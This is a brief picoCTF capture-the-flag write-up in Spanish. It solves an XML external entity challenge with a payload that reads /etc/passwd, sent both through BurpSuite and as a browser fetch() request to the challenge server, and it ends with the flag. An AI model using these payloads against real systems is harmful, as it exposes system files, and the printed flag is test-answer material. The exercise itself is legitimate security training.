### RETO

### DESCRIPCIÓN


### SOLUCIÓN

- Inyectamos una entidad XML externa, usando BurpSuite

`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <data><ID>&xxe;</ID></data>`

- Desde consola:

```
fetch("http://saturn.picoctf.net:51766/data", {
  method: "POST",
  headers: {
    "accept": "*/*",
    "accept-language": "es-419,es;q=0.9,en;q=0.8",
    "content-type": "application/xml"
  },
  referrer: "http://saturn.picoctf.net:51766/",
  mode: "cors",
  credentials: "include",
  body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY example SYSTEM "file:///etc/passwd">
]>
<data>
<ID>&example;</ID>
</data>`
})
.then(response => response.text())
.then(data => console.log(data));
```

picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
### NOTAS ADICIONALES


### REFERENCIAS